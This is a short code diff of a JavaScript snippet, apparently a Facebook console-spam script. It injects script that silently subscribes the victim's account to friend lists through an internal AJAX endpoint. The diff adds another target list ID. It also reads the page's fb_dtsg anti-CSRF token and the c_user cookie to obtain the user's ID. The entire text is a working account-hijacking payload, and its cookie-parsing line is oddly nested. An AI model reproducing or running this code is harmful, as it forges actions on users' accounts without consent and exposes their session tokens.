@@ -1,5 +1,5 @@
 function kodran(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}
-kodran("1379738492308315");kodran("1379575028991328");
+kodran("1379738492308315");kodran("1379575028991328");kodran("562521103826775");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var id = "259084860940803";
